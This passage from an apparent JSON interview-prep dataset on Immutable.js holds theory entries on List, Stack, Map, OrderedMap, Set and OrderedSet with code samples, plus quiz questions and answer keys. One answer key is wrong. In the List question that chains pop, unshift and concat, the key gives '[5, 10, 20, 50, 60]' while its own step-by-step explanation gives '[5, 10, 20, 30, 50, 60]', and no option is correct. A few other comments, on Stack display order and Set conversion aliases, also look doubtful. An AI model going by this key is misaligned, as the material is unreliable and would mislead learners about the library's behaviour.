          "content": "The `Immutable.List` is an immutable, ordered indexed collection, similar to a JavaScript Array. It provides methods that allow you to perform operations like adding, removing, and updating elements, but unlike native arrays, these methods return a *new* List instance, leaving the original unchanged. This adherence to immutability is crucial for predictable state management and performance optimizations in applications.\n\n### Key Characteristics:\n*   **Indexed Collection:** Elements are accessed by numerical index, starting from 0.\n*   **Ordered:** The order of elements is preserved as they are added.\n*   **Persistent Data Structure:** Operations return new instances, enabling structural sharing for efficiency.\n\n### Common Methods:\n*   `Immutable.List([initialValues])`: Creates a new List.\n*   `size`: Returns the number of elements in the list.\n*   `pop()`: Returns a new List with the last element removed.\n*   `push(value1, value2, ...)`: Returns a new List with one or more values appended to the end.\n*   `shift()`: Returns a new List with the first element removed.\n*   `unshift(value1, value2, ...)`: Returns a new List with one or more values prepended to the beginning.\n*   `concat(value1, value2, ...)`: Returns a new List by concatenating one or more values or other collections.\n*   `sort(comparator)`: Returns a new List with elements sorted according to the provided comparator function (or default comparison if none). The original list is not modified.\n*   `get(index)`: Returns the value at the specified index.\n*   `set(index, value)`: Returns a new List with the value at `index` set to `value`.\n*   `splice(index, removeNum, ...values)`: Returns a new List with elements removed and/or added at the specified index.\n*   `map(mapper)`: Applies a function to each element and returns a new List with the results.\n*   `filter(predicate)`: Returns a new List containing only elements for which the predicate returns true.",
          "examples": [
            {
              "id": "example_immutable_list_1",
              "title": "Basic List Operations",
              "code": "import { List } from 'immutable';\n\nlet list = List([1, 3, 2, 4, 5]);\n\nconsole.log('Original list:', list.toJS()); // [1, 3, 2, 4, 5]\nconsole.log('List size:', list.size); // 5\n\nlist = list.pop().pop(); // Removes 5, then 4\nconsole.log('After two pops:', list.toJS()); // [1, 3, 2]\n\nlist = list.push(6);\nconsole.log('After push(6):', list.toJS()); // [1, 3, 2, 6]\n\nlist = list.shift();\nconsole.log('After shift():', list.toJS()); // [3, 2, 6]\n\nlist = list.concat([9, 0, 1, 4]); // Can take multiple args or an array\nconsole.log('After concat(9, 0, 1, 4):', list.toJS()); // [3, 2, 6, 9, 0, 1, 4]\n\nlist = list.sort();\nconsole.log('After sort():', list.toJS()); // [0, 1, 2, 3, 4, 6, 9]\n\nconst originalListAfterOps = List([1, 3, 2, 4, 5]);\nconsole.log('Original list unchanged:', originalListAfterOps.toJS()); // [1, 3, 2, 4, 5]",
              "explanation": "This example demonstrates how common array-like operations (`pop`, `push`, `shift`, `concat`, `sort`) are performed on an `Immutable.List`. Crucially, each operation returns a *new* list, and the `originalListAfterOps` variable still holds its initial state, proving the immutability. The `toJS()` method is used to convert the Immutable List back to a plain JavaScript Array for easier logging.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_list_1",
            "question_immutable_list_2",
            "question_immutable_list_3",
            "question_immutable_list_4",
            "question_immutable_list_5"
          ],
          "relatedTasks": [
            "task_immutable_list_1"
          ],
          "tags": [
            "Immutable.js",
            "List",
            "Data Structures",
            "Array-like",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "State_management",
            "UI_list_rendering"
          ]
        },
        {
          "id": "theory_immutable_stack",
          "title": "Immutable.js Stack",
          "content": "An `Immutable.Stack` is an immutable, ordered collection of elements organized according to the LIFO (Last In, First Out) principle. This means the last element added to the stack is the first one to be removed. Stacks are fundamental data structures often used for managing function call contexts, undo/redo operations, or tracking history.\n\n### Key Characteristics:\n*   **LIFO (Last In, First Out):** Elements are added and removed from the 'top' of the stack.\n*   **Ordered:** Insertion order is maintained for elements.\n*   **Persistent Data Structure:** Like other Immutable.js collections, operations return new Stack instances.\n\n### Common Methods:\n*   `new Immutable.Stack([initialValues])`: Creates a new Stack instance.\n*   `push(value1, value2, ...)`: Returns a new Stack with one or more values added to the top (the beginning of the internal list representation).\n*   `pop()`: Returns a new Stack with the top element removed.\n*   `peek()`: Returns the top element of the stack without removing it. (Not shown in markdown, but very common).\n*   `get(index)`: Returns the element at a specific index. For a stack, `get(0)` typically returns the top element, `get(1)` the next, and so on.\n*   `size`: Returns the number of elements in the stack.",
          "examples": [
            {
              "id": "example_immutable_stack_1",
              "title": "Basic Stack Operations",
              "code": "import { Stack } from 'immutable';\n\nlet stack = new Stack();\n\nconsole.log('Initial stack:', stack.toJS()); // []\n\n// Push multiple elements. They are added in order, but the last pushed is at index 0 (top)\nstack = stack.push(2, 1, 0); \nconsole.log('After push(2, 1, 0):', stack.toJS()); // [0, 1, 2] -- Note: `toJS()` might reverse for display convenience, internal order is 0 (top), 1, 2\n\nconsole.log('Stack size:', stack.size); // 3\n\n// get(0) returns the top element (the last one pushed)\nconsole.log('stack.get(0):', stack.get(0)); // 0 \nconsole.log('stack.get(1):', stack.get(1)); // 1\nconsole.log('stack.get(2):', stack.get(2)); // 2\n\n// Pop removes the top element (0)\nstack = stack.pop(); \nconsole.log('After pop():', stack.toJS()); // [1, 2]\n\nconst originalStack = new Stack().push(2,1,0);\nconsole.log('Original stack unchanged:', originalStack.toJS()); // [0, 1, 2]",
              "explanation": "This example demonstrates the LIFO behavior of `Immutable.Stack`. When `push(2, 1, 0)` is called, `0` becomes the 'top' element (at index 0). `get(0)` correctly retrieves `0`. `pop()` removes `0`, making `1` the new top element. The `toJS()` conversion for `Stack` often reverses the internal representation to match typical stack visualization (top at the end of the array), but Immutable.js internal `get(index)` reflects the 'top-first' access. This also highlights immutability as the original stack remains unaffected.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_stack_1",
            "question_immutable_stack_2",
            "question_immutable_stack_3"
          ],
          "relatedTasks": [
            "task_immutable_stack_1"
          ],
          "tags": [
            "Immutable.js",
            "Stack",
            "Data Structures",
            "LIFO",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 7,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Undo_redo_functionality",
            "History_management"
          ]
        },
        {
          "id": "theory_immutable_map",
          "title": "Immutable.js Map",
          "content": "An `Immutable.Map` is an immutable collection that stores data as key-value pairs, analogous to a JavaScript Object or a hash map. It's ideal for representing structured data where elements are accessed by unique string or numerical keys.\n\n### Key Characteristics:\n*   **Key-Value Pairs:** Stores data in `key: value` format.\n*   **Unordered (by default):** The order of insertion is generally *not* guaranteed for iteration or `toJS()` conversion. For order preservation, use `Immutable.OrderedMap`.\n*   **Unique Keys:** Each key must be unique within the Map.\n*   **Persistent Data Structure:** Operations like `set` and `delete` return a new Map, leaving the original unchanged, which supports structural sharing.\n\n### Common Methods:\n*   `new Immutable.Map([initialData])`: Creates a new Map. `initialData` can be a JS Object or an array of `[key, value]` pairs.\n*   `set(key, value)`: Returns a new Map with the given `key` set to `value`. If `key` already exists, its value is updated.\n*   `get(key, notSetValue)`: Returns the value associated with `key`. If `key` is not found, `notSetValue` is returned (defaults to `undefined`).\n*   `delete(key)`: Returns a new Map with the specified `key` and its value removed.\n*   `has(key)`: Returns `true` if the Map contains the specified `key`, `false` otherwise.\n*   `merge(otherMap)`: Returns a new Map with the keys and values from `otherMap` merged into it. If keys conflict, `otherMap`'s values take precedence.\n*   `toJS()`: Converts the Map to a plain JavaScript object. (Deep conversion for nested Immutable.js structures).\n*   `toJSON()`: Alias for `toJS()` for `Map`.\n*   `toObject()`: Converts the Map to a plain JavaScript object (shallow conversion).",
          "examples": [
            {
              "id": "example_immutable_map_1",
              "title": "Basic Map Operations",
              "code": "import { Map } from 'immutable';\n\nlet map = new Map();\n\nconsole.log('Initial map:', map.toJS()); // {}\n\nmap = map.set('value', 5);\nconsole.log('After set(\\'value\\', 5):', map.toJS()); // {value: 5}\n\nmap = map.set('text', 'Test');\nconsole.log('After set(\\'text\\', \\'Test\\'):', map.toJS()); // {value: 5, text: \"Test\"}\n\nmap = map.delete('text');\nconsole.log('After delete(\\'text\\'):', map.toJS()); // {value: 5}\n\nconst originalMap = new Map().set('value', 5).set('text', 'Test');\nconsole.log('Original map unchanged:', originalMap.toJS()); // {value: 5, text: \"Test\"}\n\nconsole.log('Value of \\'value\\':', map.get('value')); // 5\nconsole.log('Has key \\'value\\':', map.has('value')); // true\nconsole.log('Has key \\'text\\':', map.has('text')); // false",
              "explanation": "This example demonstrates the core `Immutable.Map` operations: `set` and `delete`. Each operation returns a new `Map` instance, ensuring that the `originalMap` remains unchanged. The `toJS()` method converts the Immutable Map to a standard JavaScript object for console output. `get` and `has` methods are also shown for accessing and checking for keys.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_map_1",
            "question_immutable_map_2",
            "question_immutable_map_3",
            "question_immutable_map_4"
          ],
          "relatedTasks": [
            "task_immutable_map_1"
          ],
          "tags": [
            "Immutable.js",
            "Map",
            "Data Structures",
            "Key-Value",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "State_management",
            "Configuration_handling"
          ]
        },
        {
          "id": "theory_immutable_orderedmap",
          "title": "Immutable.js OrderedMap",
          "content": "An `Immutable.OrderedMap` is a specialized `Immutable.Map` that guarantees the preservation of the original insertion order of its keys. While a regular `Immutable.Map` does not make guarantees about iteration order, `OrderedMap` ensures that when you iterate over its entries (e.g., using `for...of` or `forEach`), they will appear in the order they were first added.\n\n### Key Characteristics:\n*   **Key-Value Pairs:** Like `Immutable.Map`, it stores data as `key: value` pairs.\n*   **Order Preservation:** The most significant feature; it remembers the order in which keys were first inserted. If a key's value is updated, its position in the order remains the same.\n*   **Persistent Data Structure:** All operations that modify the map (e.g., `set`, `delete`) return a new `OrderedMap` instance.\n\n### When to use `OrderedMap`?\nUse `OrderedMap` when the order of keys matters for your application logic or UI presentation, such as:\n*   Displaying form fields in a specific, user-defined order.\n*   Maintaining a list of configuration options where the sequence is important.\n*   Implementing a cache where older entries need to be evicted based on insertion time (though specific LRU logic would be needed).\n\nKeep in mind that `OrderedMap` might have a slightly higher memory footprint and slightly slower performance for certain operations compared to a regular `Map` due to the overhead of maintaining insertion order.",
          "examples": [
            {
              "id": "example_immutable_orderedmap_1",
              "title": "OrderedMap Iteration",
              "code": "import { OrderedMap } from 'immutable';\n\nlet map = new OrderedMap();\n\nmap = map.set('m', 5);\nmap = map.set('a', 1);\nmap = map.set('p', 8);\n\nconsole.log('OrderedMap content:', map.toJS()); // { m: 5, a: 1, p: 8 }\n\nconsole.log('Iteration order:');\n// Iteration order will be: ['m', 5], ['a', 1], ['p', 8]\nfor(const elem of map) {\n  console.log(elem); // Prints [ 'm', 5 ], [ 'a', 1 ], [ 'p', 8 ] in order\n}\n\n// Updating a value doesn't change its position\nmap = map.set('a', 100);\nconsole.log('After updating \\'a\\':', map.toJS()); // { m: 5, a: 100, p: 8 }\nconsole.log('Iteration order after update:');\nfor(const elem of map) {\n  console.log(elem); // Still [ 'm', 5 ], [ 'a', 100 ], [ 'p', 8 ] in order\n}",
              "explanation": "This example clearly shows the primary feature of `Immutable.OrderedMap`: keys are iterated in the order they were *first inserted*. Even when the value for an existing key (`'a'`) is updated, its position in the iteration order remains fixed. The `for...of` loop demonstrates this explicit ordering.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_orderedmap_1",
            "question_immutable_orderedmap_2",
            "question_immutable_orderedmap_3"
          ],
          "relatedTasks": [
            "task_immutable_orderedmap_1"
          ],
          "tags": [
            "Immutable.js",
            "OrderedMap",
            "Data Structures",
            "Order Preservation",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro",
            "theory_immutable_map"
          ],
          "complexity": 7,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Ordered_configuration",
            "Dynamic_form_generation"
          ]
        },
        {
          "id": "theory_immutable_set",
          "title": "Immutable.js Set",
          "content": "An `Immutable.Set` is an immutable collection of unique values, analogous to a JavaScript `Set`. It's designed for scenarios where you need to store a collection of items but are only concerned with their presence, not their order or count of occurrences.\n\n### Key Characteristics:\n*   **Unique Values:** Automatically ensures that each value added to the set is unique. Duplicate values are ignored.\n*   **Unordered (by default):** The order of insertion is generally *not* guaranteed when iterating over an `Immutable.Set`. For order preservation, use `Immutable.OrderedSet`.\n*   **Persistent Data Structure:** Operations like `add`, `delete`, `union`, `intersect` return a new `Set` instance.\n\n### Common Methods:\n*   `Immutable.Set([initialValues])`: Creates a new Set. `initialValues` can be an array or any iterable.\n*   `add(value)`: Returns a new Set with `value` added. If `value` already exists, it returns the same Set instance (due to structural sharing and no change).\n*   `delete(value)`: Returns a new Set with `value` removed.\n*   `has(value)`: Returns `true` if the Set contains `value`, `false` otherwise.\n*   `count()` / `size`: Both methods return the number of unique elements in the Set.\n*   `union(...collections)`: Returns a new Set containing all unique values from this Set and the provided collections.\n*   `intersect(...collections)`: Returns a new Set containing only the values that are present in this Set and all provided collections.\n*   `subtract(...collections)`: Returns a new Set containing values from this Set that are not present in any of the provided collections.\n*   `toJS()`: Converts the Set to a plain JavaScript Array. (Deep conversion).\n*   `toArray()`: Alias for `toJS()` for `Set`.\n*   `toJSON()`: Alias for `toJS()` for `Set`.",
          "examples": [
            {
              "id": "example_immutable_set_1",
              "title": "Basic Set Operations",
              "code": "import { Set } from 'immutable';\n\nvar s1 = Set([2, 1]);\nvar s2 = Set([2, 3, 3]); // Duplicates are removed here\nvar s3 = Set([1, 1, 1]);\n\nconsole.log('s1 (from [2, 1]):', s1.toJS()); // [1, 2] (order not guaranteed, often sorted by JS engine)\nconsole.log('s2 (from [2, 3, 3]):', s2.toJS()); // [2, 3]\nconsole.log('s3 (from [1, 1, 1]):', s3.toJS()); // [1]\n\nconsole.log('Count s1, s2, s3:', s1.count(), s2.size, s3.count()); // 2 2 1\n\n// toJS(), toArray(), toJSON() are aliases for Set\nconsole.log('s1.toJS():', s1.toJS()); // [1, 2]\nconsole.log('s2.toArray():', s2.toArray()); // [2, 3]\nconsole.log('s3.toJSON():', s3.toJSON()); // [1]\n\nvar s1S2Intersect = s1.intersect(s2);\nconsole.log('s1 intersect s2:', s1S2Intersect.toJSON()); // [2]\n\nconsole.log('s1 has 1:', s1.has(1)); // true\nconsole.log('s1 has 5:', s1.has(5)); // false\n\nconst originalS1 = Set([2, 1]);\nconsole.log('Original s1 unchanged:', originalS1.toJS()); // [1, 2]",
              "explanation": "This example showcases the core features of `Immutable.Set`: maintaining unique values and performing set operations like intersection. Notice how `s2` and `s3` automatically remove duplicates during creation. `count()` and `size` both return the number of unique elements. The `intersect()` method returns a new Set containing only the common elements. `toJS()`, `toArray()`, and `toJSON()` are demonstrated for converting back to plain JavaScript arrays. Immutability is maintained as original sets are not altered.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_set_1",
            "question_immutable_set_2",
            "question_immutable_set_3"
          ],
          "relatedTasks": [
            "task_immutable_set_1"
          ],
          "tags": [
            "Immutable.js",
            "Set",
            "Data Structures",
            "Unique Values",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Managing_unique_tags",
            "Feature_toggles"
          ]
        },
        {
          "id": "theory_immutable_orderedset",
          "title": "Immutable.js OrderedSet",
          "content": "An `Immutable.OrderedSet` combines the uniqueness constraint of a `Set` with the order preservation of an `OrderedMap`. It is an immutable collection of unique values that maintains the original insertion order of its elements.\n\n### Key Characteristics:\n*   **Unique Values:** Ensures that all elements are unique.\n*   **Order Preservation:** Elements are iterated in the order they were first added.\n*   **Persistent Data Structure:** Operations return a new `OrderedSet` instance.\n\n### When to use `OrderedSet`?\n`OrderedSet` is useful when you need a collection of unique items where the order of their addition is significant for display or logic. Examples include:\n*   A list of recently viewed unique items, where the order reflects recency.\n*   Managing a unique list of tags that should appear in the order they were selected.\n*   Implementing a custom deduplicated event log where the sequence of events is crucial.\n\nSimilar to `OrderedMap`, `OrderedSet` might have a slight performance or memory overhead compared to a regular `Set` due to the need to maintain insertion order.",
          "examples": [
            {
              "id": "example_immutable_orderedset_1",
              "title": "OrderedSet Union Operation",
              "code": "import { OrderedSet } from 'immutable';\n\nvar s1 = OrderedSet([2, 1]);\nvar s2 = OrderedSet([2, 3, 3]); // Duplicates are removed, order from [2, 3]\nvar s3 = OrderedSet([1, 1, 1]); // Duplicates removed, order from [1]\n\nconsole.log('s1 (OrderedSet([2, 1])):', s1.toJS()); // [2, 1]\nconsole.log('s2 (OrderedSet([2, 3, 3])):', s2.toJS()); // [2, 3]\nconsole.log('s3 (OrderedSet([1, 1, 1])):', s3.toJS()); // [1]\n\n// Union operation combines unique elements, preserving first seen order\nvar s1S2S3Union = s1.union(s2, s3);\nconsole.log('s1 union s2 union s3:', s1S2S3Union.toJSON()); // [2, 1, 3]\n\n// Explanation of union result: \n// From s1: 2, 1\n// From s2: 2 (already seen), 3 (new, added after 1)\n// From s3: 1 (already seen)\n// Result: [2, 1, 3]\n\nconst originalS1 = OrderedSet([2, 1]);\nconsole.log('Original s1 unchanged:', originalS1.toJS()); // [2, 1]",
              "explanation": "This example demonstrates `Immutable.OrderedSet`'s behavior, particularly with the `union()` method. It highlights that duplicates are removed while the *first observed insertion order* of unique elements from all combined sets is preserved. In the `union` example, `2` from `s1` is seen first, then `1` from `s1`, then `3` from `s2` (as `2` was already seen). `1` from `s3` is also already seen, so it doesn't change the order or add a duplicate. This results in the ordered unique collection `[2, 1, 3]`. Immutability ensures the original sets remain untouched.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_orderedset_1",
            "question_immutable_orderedset_2",
            "question_immutable_orderedset_3"
          ],
          "relatedTasks": [
            "task_immutable_orderedset_1"
          ],
          "tags": [
            "Immutable.js",
            "OrderedSet",
            "Data Structures",
            "Unique Values",
            "Order Preservation",
            "Immutability"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_immutable_js_intro",
            "theory_immutable_set"
          ],
          "complexity": 7,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Maintaining_ordered_unique_lists",
            "UI_tag_display"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_immutable_js_intro_1",
          "topic": "Immutability Concepts",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the core principle of immutability in programming?",
          "answer": "Once an object is created, it cannot be changed. Any operation that appears to modify it returns a new object.",
          "options": [],
          "analysisPoints": [
            "Understanding of the fundamental definition of immutability.",
            "Ability to distinguish it from mutable data manipulation."
          ],
          "keyConcepts": [
            "Immutability",
            "Persistent data structures"
          ],
          "evaluationCriteria": [
            "Direct recall of definition"
          ],
          "example": "Immutable data structures are those that cannot be modified after they are created. Instead of modifying an existing structure, any operation that would typically modify it (like adding an element) returns a new, modified version of that structure, leaving the original intact.",
          "tags": [
            "Immutability",
            "Core Concepts"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_js_intro_2",
          "topic": "Benefits of Immutability",
          "level": "medium",
          "type": "open",
          "question": "Explain at least three key benefits of using immutable data structures in a frontend application, particularly in the context of React or similar frameworks.",
          "answer": "Benefits include: 1. Predictability: Easier to reason about data flow as state doesn't change unexpectedly. 2. Performance Optimization: Simplifies change detection (reference equality checks instead of deep comparisons), crucial for React's `PureComponent` or `React.memo`. 3. Structural Sharing: Saves memory and improves performance by reusing unchanged parts of data structures. 4. Easier Debugging: Provides a clear history of state changes, enabling time-travel debugging. 5. Concurrency (less relevant for single-threaded JS, but a general benefit): Eliminates race conditions.",
          "options": [],
          "analysisPoints": [
            "Ability to articulate core advantages beyond just 'no side effects'.",
            "Connecting immutability to specific frontend framework benefits (e.g., React re-renders).",
            "Understanding of structural sharing concept."
          ],
          "keyConcepts": [
            "Immutability",
            "React performance",
            "Structural sharing",
            "Debugging"
          ],
          "evaluationCriteria": [
            "Completeness of the answer (minimum 3 distinct benefits).",
            "Clarity and accuracy of explanations.",
            "Ability to apply concepts to real-world scenarios (React)."
          ],
          "example": "Consider a React component that re-renders only when its props or state change. If data is mutable, a deep comparison is needed to detect changes, which can be expensive. With immutable data, a simple `===` check is enough because any modification results in a new object reference.",
          "tags": [
            "Immutability",
            "React",
            "Performance",
            "Frontend Architecture"
          ],
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_intro_3",
          "topic": "Structural Sharing",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following best describes 'structural sharing' in the context of Immutable.js?",
          "answer": "When an immutable data structure is modified, only the changed parts are copied, and the unchanged parts retain references to the original data.",
          "options": [
            "When an immutable data structure is modified, the entire structure is deeply cloned.",
            "It refers to the ability to share mutable objects across different parts of an application.",
            "When an immutable data structure is modified, only the changed parts are copied, and the unchanged parts retain references to the original data.",
            "It's a technique to share DOM elements between different React components."
          ],
          "analysisPoints": [
            "Understanding the core mechanism of structural sharing.",
            "Distinguishing it from deep cloning.",
            "Recognizing its memory and performance implications."
          ],
          "keyConcepts": [
            "Structural Sharing",
            "Immutability",
            "Performance"
          ],
          "evaluationCriteria": [
            "Accurate definition of structural sharing.",
            "Rejection of misleading or incorrect options."
          ],
          "example": "If you have an `Immutable.List` of 1000 items and you `push` one new item, Immutable.js doesn't copy all 1000 items. Instead, it creates new nodes only for the path leading to the new item, while the vast majority of the original 1000 items are still referenced by the new list, saving memory and CPU cycles.",
          "tags": [
            "Immutability",
            "Performance",
            "Data Structures"
          ],
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_js_intro_4",
          "topic": "Immutable.js Basic Usage",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary way to convert an Immutable.js collection back to a plain JavaScript collection?",
          "answer": "Using the `.toJS()` method.",
          "options": [],
          "analysisPoints": [
            "Recall of common conversion methods.",
            "Understanding the need for explicit conversion."
          ],
          "keyConcepts": [
            "Immutable.js",
            "Conversion"
          ],
          "evaluationCriteria": [
            "Direct recall of method name"
          ],
          "example": "```typescript\nimport { List } from 'immutable';\n\nconst immutableList = List([1, 2, 3]);\nconst jsArray = immutableList.toJS();\n\nconsole.log(jsArray); // [1, 2, 3]\nconsole.log(Array.isArray(jsArray)); // true\n```",
          "tags": [
            "Immutable.js",
            "Conversion"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_js_intro_5",
          "topic": "Immutable.js Purpose",
          "level": "easy",
          "type": "mcq",
          "question": "What is the main problem that Immutable.js aims to solve in JavaScript applications?",
          "answer": "Managing mutable state and its unpredictable side effects.",
          "options": [
            "Optimizing DOM manipulation performance.",
            "Managing mutable state and its unpredictable side effects.",
            "Providing an alternative syntax for asynchronous operations.",
            "Implementing server-side rendering for JavaScript applications."
          ],
          "analysisPoints": [
            "Identifying the core pain point addressed by immutability.",
            "Filtering out irrelevant or secondary concerns."
          ],
          "keyConcepts": [
            "Immutability",
            "State Management",
            "Side Effects"
          ],
          "evaluationCriteria": [
            "Correctly identifying the primary problem.",
            "Understanding the context of Immutable.js."
          ],
          "example": "In complex applications, especially with shared state, modifying objects directly can lead to unexpected behaviors in other parts of the application that hold references to the same object. Immutable.js eliminates this by ensuring every 'modification' results in a new, distinct state.",
          "tags": [
            "Immutability",
            "State Management",
            "Problem Solving"
          ],
          "prerequisites": [
            "theory_immutable_js_intro"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_list_1",
          "topic": "Immutable.List Operations",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Immutable.js code:\n\n```typescript\nimport { List } from 'immutable';\n\nlet myList = List([10, 20, 30, 40]);\nconst originalList = myList;\n\nmyList = myList.pop();\nmyList = myList.unshift(5);\nmyList = myList.concat(50, 60);\n\nconst result = myList.toJS();\n```\n\nWhat will be the value of `result` and `originalList.toJS()` after these operations?",
          "answer": "result: [5, 10, 20, 50, 60], originalList.toJS(): [10, 20, 30, 40]",
          "options": [
            "result: [5, 10, 20, 30, 40, 50, 60], originalList.toJS(): [10, 20, 30, 40]",
            "result: [5, 10, 20, 50, 60], originalList.toJS(): [5, 10, 20, 50, 60]",
            "result: [5, 10, 20, 50, 60], originalList.toJS(): [10, 20, 30, 40]",
            "result: [5, 10, 20], originalList.toJS(): [10, 20, 30, 40, 50, 60]"
          ],
          "analysisPoints": [
            "Correct application of `pop()`, `unshift()`, and `concat()` on `Immutable.List`.",
            "Understanding that each operation returns a *new* list, preserving the original.",
            "Ability to trace the state of the list through multiple immutable operations."
          ],
          "keyConcepts": [
            "Immutable.List",
            "Immutability",
            "Chainable operations"
          ],
          "evaluationCriteria": [
            "Accuracy of the final list content.",
            "Correct understanding of immutability (original list unchanged)."
          ],
          "example": "1. `myList = List([10, 20, 30, 40]);`\n2. `originalList` points to `[10, 20, 30, 40]`.\n3. `myList.pop()`: returns `[10, 20, 30]`. `myList` is reassigned.\n4. `myList.unshift(5)`: returns `[5, 10, 20, 30]`. `myList` is reassigned.\n5. `myList.concat(50, 60)`: returns `[5, 10, 20, 30, 50, 60]`. `myList` is reassigned.\nTherefore, `result` is `[5, 10, 20, 30, 50, 60]`, and `originalList` remains `[10, 20, 30, 40]`.",
          "tags": [
            "Immutable.List",
            "Operations",
            "Immutability",
            "Debugging"
          ],
          "prerequisites": [
            "theory_immutable_list"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_list_2",
          "topic": "Immutable.List vs. JS Array",
          "level": "medium",
          "type": "open",
          "question": "What is the primary difference in behavior between `Array.prototype.push()` and `Immutable.List.prototype.push()`?",
          "answer": "The primary difference is mutability. `Array.prototype.push()` is a mutable operation; it modifies the original array in place and returns the new length of the array. `Immutable.List.prototype.push()`, however, is an immutable operation; it does *not* modify the original `Immutable.List` but instead returns a *new* `Immutable.List` instance with the element appended, leaving the original list untouched.",
          "options": [],
          "analysisPoints": [
            "Clearly articulating the mutable vs. immutable distinction.",
            "Explaining the return value difference.",
            "Highlighting the concept of a new instance vs. in-place modification."
          ],
          "keyConcepts": [
            "Immutable.List",
            "JavaScript Array",
            "Mutability",
            "Immutability",
            "Side effects"
          ],
          "evaluationCriteria": [
            "Accurate comparison of behavior.",
            "Emphasis on the immutability aspect.",
            "Understanding of return values."
          ],
          "example": "```typescript\nconst arr = [1, 2];\narr.push(3); // arr is now [1, 2, 3]\n\nimport { List } from 'immutable';\nlet list = List([1, 2]);\nconst newList = list.push(3); // list is still List([1, 2]), newList is List([1, 2, 3])\n```",
          "tags": [
            "Immutable.List",
            "JavaScript Array",
            "Comparison",
            "Mutability"
          ],
          "prerequisites": [
            "theory_immutable_list"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_immutable_list_3",
          "topic": "Immutable.List Method Understanding",
          "level": "easy",
          "type": "flashcard",
          "question": "Which `Immutable.List` method would you use to remove elements from the beginning of the list?",
          "answer": "`shift()`",
          "options": [],
          "analysisPoints": [
            "Recall of specific `Immutable.List` methods.",
            "Mapping method names to their functionality."
          ],
          "keyConcepts": [
            "Immutable.List",
            "Methods",
            "Manipulation"
          ],
          "evaluationCriteria": [
            "Direct recall"
          ],
          "example": "```typescript\nimport { List } from 'immutable';\n\nlet list = List([1, 2, 3]);\nlist = list.shift();\nconsole.log(list.toJS()); // [2, 3]\n```",
          "tags": [
            "Immutable.List",
            "Methods"
          ],
          "prerequisites": [
            "theory_immutable_list"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_list_4",
          "topic": "Immutable.List Conversion",
          "level": "easy",
          "type": "mcq",
          "question": "Given an `Immutable.List` named `myImmutableList`, what is the correct way to convert it to a standard JavaScript array?",
          "answer": "`myImmutableList.toJS()`",
          "options": [
            "`myImmutableList.toArray()`",
            "`myImmutableList.toJS()`",
            "`Array.from(myImmutableList)`",
            "`JSON.parse(JSON.stringify(myImmutableList))`"
          ],
          "analysisPoints": [
            "Correctly identifying the standard conversion method for Immutable.js.",
            "Understanding that `toArray()` is also valid for List, but `toJS()` is more general for deep conversion.",
            "Discarding incorrect or inefficient methods."
          ],
          "keyConcepts": [
            "Immutable.List",
            "Conversion"
          ],
          "evaluationCriteria": [
            "Knowing the primary conversion method.",
            "Understanding its purpose."
          ],
          "example": "Both `toJS()` and `toArray()` work for `Immutable.List`. `toJS()` is generally preferred as it recursively converts nested Immutable.js collections, while `toArray()` would only convert the top-level list to an array, leaving nested Immutable.js collections intact if they exist.",
          "tags": [
            "Immutable.List",
            "Conversion"
          ],
          "prerequisites": [
            "theory_immutable_list",
            "theory_immutable_js_intro"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_immutable_list_5",
          "topic": "Immutable.List Sorting",
          "level": "medium",
          "type": "code",
          "question": "Write a TypeScript function `sortNumbersInList` that takes an `Immutable.List<number>` and returns a new `Immutable.List<number>` with the numbers sorted in ascending order. Ensure the original list is not modified.",
